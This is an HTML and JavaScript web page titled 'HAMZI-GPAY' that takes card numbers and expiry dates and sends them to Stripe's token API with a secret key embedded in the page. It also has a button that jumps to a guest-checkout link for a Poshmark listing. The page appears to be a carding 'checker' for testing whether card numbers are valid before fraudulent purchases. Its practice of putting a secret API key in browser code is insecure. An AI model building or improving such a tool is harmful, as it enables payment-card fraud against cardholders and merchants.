<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HAMZI-GPAY</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<script src="https://unpkg.com/lucide@latest"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
    font-family:'Inter',sans-serif;
    background:linear-gradient(145deg,#eef2f7,#e2e8f0);
    display:flex;
    align-items:center;
    justify-content:center;
    min-height:100vh;
}

.card{
    width:100%;
    max-width:520px;
    background:#fff;
    border-radius:32px;
    padding:30px;
    box-shadow:0 25px 50px rgba(0,0,0,0.08);
}

.header{
    display:flex;
    align-items:center;
    gap:10px;
    margin-bottom:20px;
}

.header i{color:#2563eb}

.sub{
    background:#f1f5f9;
    padding:8px 14px;
    border-radius:20px;
    font-size:13px;
    margin-bottom:20px;
}

.input-group{margin-bottom:15px}

.label{
    font-size:13px;
    margin-bottom:5px;
    display:flex;
    align-items:center;
    gap:6px;
}

.field{
    width:100%;
    padding:12px;
    border-radius:16px;
    border:1px solid #e2e8f0;
}

.row{display:flex;gap:10px}

.btn-group{
    display:flex;
    gap:10px;
    margin-top:20px;
}

.btn{
    flex:1;
    padding:12px;
    border-radius:30px;
    border:none;
    font-weight:600;
    cursor:pointer;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:6px;
}

.btn-primary{background:#0f172a;color:#fff}
.btn-secondary{background:#fff;border:1px solid #e2e8f0}

.status{
    margin-top:15px;
    padding:12px;
    border-radius:20px;
    font-size:14px;
    border:1px solid #ddd;
}

.success{background:#ecfdf5;color:#166534}
.failed{background:#fef2f2;color:#991b1b}

#card-logo svg{
    width:100%;
    height:100%;
}

.footer{
    margin-top:15px;
    font-size:11px;
    text-align:center;
    color:#64748b;
}
</style>
</head>

<body>

<div class="card">

<div class="header">
<i data-lucide="shield-check"></i>
<h2>HAMZI-GPAY</h2>
</div>

<div class="sub">VIP Secure Card Auth • Premium Mode</div>

<form id="payment-form">

<div class="input-group">
<div class="label"><i data-lucide="credit-card"></i> Card Number</div>

<div style="position:relative;">
<input type="text" id="card" class="field" placeholder="1234 5678 9012 3456">

<div id="card-logo" style="
position:absolute;
right:10px;
top:50%;
transform:translateY(-50%);
width:50px;
height:30px;"></div>
</div>
</div>

<div class="row">
<div class="input-group">
<div class="label"><i data-lucide="calendar"></i> Month</div>
<input type="text" id="month" class="field" placeholder="MM">
</div>

<div class="input-group">
<div class="label"><i data-lucide="calendar"></i> Year</div>
<input type="text" id="year" class="field" placeholder="YYYY">
</div>
</div>

<div class="btn-group">
<button class="btn btn-primary" id="submit">
<i data-lucide="plus-circle"></i> Add Card
</button>

<button type="button" class="btn btn-secondary" id="redirect">
<i data-lucide="map-pin"></i> ADD ADDRESS GPAY
</button>
</div>

</form>

<div id="status" class="status">Ready</div>

<div class="footer">HAMZI-GPAY • Secure Gateway</div>

</div>

<script>
lucide.createIcons();

// 🔑 PLACEHOLDER
const STRIPE_SECRET_KEY = "YOUR_STRIPE_SECRET_KEY";

// 🌐 PLACEHOLDER
const STRIPE_URL = "https://api.stripe.com/v1/tokens";

const form = document.getElementById('payment-form');
const statusBox = document.getElementById('status');

const cardInput = document.getElementById('card');
const monthInput = document.getElementById('month');
const yearInput = document.getElementById('year');
const cardLogo = document.getElementById('card-logo');

// 🎨 SVG LOGOS
const logos = {
    visa:`<svg viewBox="0 0 60 30"><rect width="60" height="30" rx="6" fill="#1a1f71"/><text x="50%" y="55%" fill="#fff" font-size="14" text-anchor="middle">VISA</text></svg>`,
    mastercard:`<svg viewBox="0 0 60 30"><rect width="60" height="30" rx="6" fill="#000"/><circle cx="25" cy="15" r="10" fill="#EB001B"/><circle cx="35" cy="15" r="10" fill="#F79E1B"/></svg>`,
    amex:`<svg viewBox="0 0 60 30"><rect width="60" height="30" rx="6" fill="#2e77bb"/><text x="50%" y="55%" fill="#fff" font-size="10" text-anchor="middle">AMEX</text></svg>`
};

// detect
function detectCardType(num){
    if(/^4/.test(num)){cardLogo.innerHTML=logos.visa;return}
    if(/^5[1-5]/.test(num)){cardLogo.innerHTML=logos.mastercard;return}
    if(/^3[47]/.test(num)){cardLogo.innerHTML=logos.amex;return}
    cardLogo.innerHTML="";
}

// format + detect
cardInput.addEventListener('input',()=>{
    let v=cardInput.value.replace(/\D/g,'').slice(0,16);
    v=v.replace(/(.{4})/g,'$1 ').trim();
    cardInput.value=v;

    detectCardType(v.replace(/\s/g,''));
});

// validation
function validCard(n){return /^\d{16}$/.test(n)}
function validMonth(m){return /^(0[1-9]|1[0-2])$/.test(m)}
function validYear(y){return /^\d{4}$/.test(y) && y>=new Date().getFullYear()}

// redirect
document.getElementById('redirect').onclick=()=>{
    window.location.href="https://poshmark.com/listing/698379889936d63f3595afb8/guest_buy?size=2";
};

// submit
form.addEventListener('submit',async(e)=>{
e.preventDefault();

let card=cardInput.value.replace(/\s/g,'');
let m=monthInput.value;
let y=yearInput.value;

if(!validCard(card)){statusBox.innerText="Invalid card";statusBox.className="status failed";return;}
if(!validMonth(m)){statusBox.innerText="Invalid month";statusBox.className="status failed";return;}
if(!validYear(y)){statusBox.innerText="Invalid year";statusBox.className="status failed";return;}

statusBox.innerText="Processing...";
statusBox.className="status";

const formData=new URLSearchParams();
formData.append('card[number]',card);
formData.append('card[exp_month]',m);
formData.append('card[exp_year]',y);

try{
const res=await fetch(STRIPE_URL,{
method:'POST',
headers:{
'Authorization':'Basic '+btoa(STRIPE_SECRET_KEY+':'),
'Content-Type':'application/x-www-form-urlencoded'
},
body:formData
});

const data=await res.json();

if(res.status===200){
statusBox.innerText="Card Added Successfully";
statusBox.className="status success";
}else{
statusBox.innerText=data.error?.message||"Failed";
statusBox.className="status failed";
}

}catch{
statusBox.innerText="Network error";
statusBox.className="status failed";
}

});
</script>

</body>
</html>
